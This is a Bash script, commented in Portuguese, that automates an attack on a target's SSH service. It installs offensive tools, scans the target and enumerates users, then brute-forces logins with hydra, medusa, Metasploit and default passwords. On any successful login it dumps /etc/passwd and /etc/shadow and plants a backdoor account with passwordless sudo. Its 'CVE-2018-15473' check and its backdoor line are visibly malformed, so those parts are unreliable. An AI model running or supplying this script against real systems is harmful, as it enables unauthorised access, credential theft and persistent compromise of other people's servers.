#!/bin/bash
# Script de Exploração SSH - Autônomo e Brutal

# Solicitar target e IP do usuário
if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Uso: $0 <DOMINIO> <IP>"
    echo "Exemplo: $0 exemplo.com.br 192.168.1.100"
    exit 1
fi

TARGET="$1"
IP="$2"
PORTS=("22" "2222")
LOG_DIR="./logs"
RESULTS_DIR="./results"

# Cores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}[*] Iniciando exploração SSH contra ${TARGET}${NC}"

mkdir -p $LOG_DIR $RESULTS_DIR

# Verificar e instalar ferramentas
check_and_install() {
    if ! command -v $1 &> /dev/null; then
        echo -e "${YELLOW}[!] $1 não encontrado. Instalando...${NC}"
        sudo apt-get update -qq
        sudo apt-get install -y $2
    fi
}

echo -e "${GREEN}[*] Verificando ferramentas...${NC}"
check_and_install "nmap" "nmap"
check_and_install "hydra" "hydra"
check_and_install "ssh" "openssh-client"
check_and_install "msfconsole" "metasploit-framework"
check_and_install "john" "john"
check_and_install "ssh-audit" "ssh-audit"
check_and_install "sshpass" "sshpass"

# Wordlist
if [ ! -f "/tmp/rockyou.txt" ]; then
    sudo gunzip -c /usr/share/wordlists/rockyou.txt.gz > /tmp/rockyou.txt 2>/dev/null || \
    wget -q https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O /tmp/rockyou.txt
fi

# 1. SCANNING E FINGERPRINTING
echo -e "${GREEN}[*] Fase 1: Scanning e Fingerprinting${NC}"
for port in "${PORTS[@]}"; do
    echo -e "${YELLOW}[*] Analisando porta $port...${NC}"
    nmap -p $port -sV -sC --script ssh-hostkey,ssh2-enum-algos,ssh-auth-methods $IP -oN $LOG_DIR/ssh_scan_${port}.txt
    
    # SSH Audit
    ssh-audit $IP:$port > $LOG_DIR/ssh_audit_${port}.txt 2>&1
done

# 2. ENUMERAÇÃO DE USUÁRIOS
echo -e "${GREEN}[*] Fase 2: Enumeração de Usuários${NC}"
COMMON_USERS=("root" "admin" "administrator" "test" "user" "guest" "mysql" "www-data" "apache" "nobody")

# Tentar enumeração via timing attack
for port in "${PORTS[@]}"; do
    for user in "${COMMON_USERS[@]}"; do
        echo -e "${YELLOW}[*] Testando usuário $user na porta $port...${NC}"
        timeout 2 ssh -o ConnectTimeout=2 -o PreferredAuthentications=password -o PubkeyAuthentication=no $user@$IP -p $port 2>&1 | tee -a $LOG_DIR/ssh_user_enum_${port}.txt
    done
done

# 3. BRUTE FORCE AGRESSIVO
echo -e "${GREEN}[*] Fase 3: Brute Force Agressivo${NC}"
for port in "${PORTS[@]}"; do
    echo -e "${RED}[!] Iniciando brute force na porta $port...${NC}"
    
    # Hydra com múltiplos usuários
    for user in "${COMMON_USERS[@]}"; do
        hydra -l $user -P /tmp/rockyou.txt $IP ssh -s $port -t 16 -W 1 -f -o $LOG_DIR/hydra_ssh_${port}_${user}.txt 2>&1 &
    done
    wait
    
    # Medusa (alternativa)
    if command -v medusa &> /dev/null; then
        for user in "${COMMON_USERS[@]}"; do
            medusa -h $IP -u $user -P /tmp/rockyou.txt -M ssh -n $port -t 10 >> $LOG_DIR/medusa_ssh_${port}.txt 2>&1 &
        done
    fi
done
wait

# 4. EXPLOITS DE VULNERABILIDADES
echo -e "${GREEN}[*] Fase 4: Exploits de Vulnerabilidades${NC}"
for port in "${PORTS[@]}"; do
    # Metasploit - múltiplos módulos
    msfconsole -q -x "
    use auxiliary/scanner/ssh/ssh_version;
    set RHOSTS $IP;
    set RPORT $port;
    run;
    use auxiliary/scanner/ssh/ssh_login;
    set RHOSTS $IP;
    set RPORT $port;
    set USERNAME root;
    set BLANK_PASSWORDS true;
    set USER_AS_PASS true;
    set VERBOSE true;
    run;
    use exploit/linux/ssh/sshexec;
    set RHOSTS $IP;
    set RPORT $port;
    set USERNAME root;
    set PASSWORD root;
    run;
    exit;
    " > $LOG_DIR/metasploit_ssh_${port}.txt 2>&1
done

# 5. TENTATIVAS DE CONEXÃO COM CREDENCIAIS COMUNS
echo -e "${GREEN}[*] Fase 5: Tentativas de Conexão Direta${NC}"
COMMON_PASSWORDS=("root" "admin" "password" "123456" "toor" "test" "")

for port in "${PORTS[@]}"; do
    for user in "${COMMON_USERS[@]}"; do
        for pass in "${COMMON_PASSWORDS[@]}"; do
            echo -e "${YELLOW}[*] Tentando: $user:$pass@$IP:$port${NC}"
            sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -p $port $user@$IP "whoami" 2>&1 | tee -a $LOG_DIR/ssh_connections_${port}.txt
            if [ $? -eq 0 ]; then
                echo -e "${GREEN}[!!!] SUCESSO: $user:$pass@$IP:$port${NC}" | tee -a $RESULTS_DIR/ssh_credentials.txt
                
                # Pós-exploração imediata
                echo -e "${RED}[!] Executando pós-exploração...${NC}"
                sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -p $port $user@$IP "
                id;
                uname -a;
                cat /etc/passwd;
                cat /etc/shadow 2>/dev/null;
                ps aux;
                netstat -tulpn;
                find / -perm -4000 2>/dev/null | head -20;
                " > $RESULTS_DIR/ssh_post_exploit_${user}_${port}.txt 2>&1
                
                # Criar backdoor
                echo -e "${RED}[!] Criando backdoor...${NC}"
                sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -p $port $user@$IP "
                echo '$user:\$(openssl passwd -1 P@ssw0rd123!)' | sudo tee -a /etc/passwd 2>/dev/null;
                echo '$user ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers 2>/dev/null;
                " >> $RESULTS_DIR/ssh_backdoor_${port}.txt 2>&1
            fi
        done
    done
done

# 6. EXPLORAÇÃO DE CHAVES SSH FRACAS
echo -e "${GREEN}[*] Fase 6: Análise de Chaves SSH${NC}"
# Tentar usar chaves conhecidas
if [ -d ~/.ssh ]; then
    for key in ~/.ssh/id_*; do
        if [ -f "$key" ] && [ ! -f "${key}.pub" ]; then
            for port in "${PORTS[@]}"; do
                for user in "${COMMON_USERS[@]}"; do
                    ssh -i $key -o ConnectTimeout=5 -p $port $user@$IP "whoami" 2>&1 | grep -q "$user" && {
                        echo -e "${GREEN}[!!!] Chave $key funciona para $user@$IP:$port${NC}" | tee -a $RESULTS_DIR/ssh_keys.txt
                    }
                done
            done
        fi
    done
fi

# 7. EXPLORAÇÃO DE VULNERABILIDADES ESPECÍFICAS
echo -e "${GREEN}[*] Fase 7: Exploração de Vulnerabilidades Específicas${NC}"
# OpenSSH 7.4 - verificar exploits conhecidos
for port in "${PORTS[@]}"; do
    # CVE-2018-15473 (Username enumeration)
    echo -e "${YELLOW}[*] Testando CVE-2018-15473...${NC}"
    python3 << EOF 2>&1 | tee -a $LOG_DIR/ssh_cve2018-15473_${port}.txt
import socket
import sys

def check_user(host, port, username):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    try:
        sock.connect((host, port))
        sock.recv(1024)
        sock.send(f'SSH-2.0-OpenSSH_7.4\r\n'.encode())
        sock.recv(1024)
        sock.send(f'{username}\r\n'.encode())
        response = sock.recv(1024).decode()
        sock.close()
        if 'Invalid username' in response or 'Permission denied' in response:
            return True
    except:
        pass
    return False

for user in ['root', 'admin', 'test', 'user']:
    if check_user('$IP', $port, user):
        print(f'[+] Usuário possível: {user}')
EOF
done

echo -e "${GREEN}[*] Exploração SSH concluída!${NC}"
echo -e "${GREEN}[*] Logs: $LOG_DIR${NC}"
echo -e "${GREEN}[*] Resultados: $RESULTS_DIR${NC}"

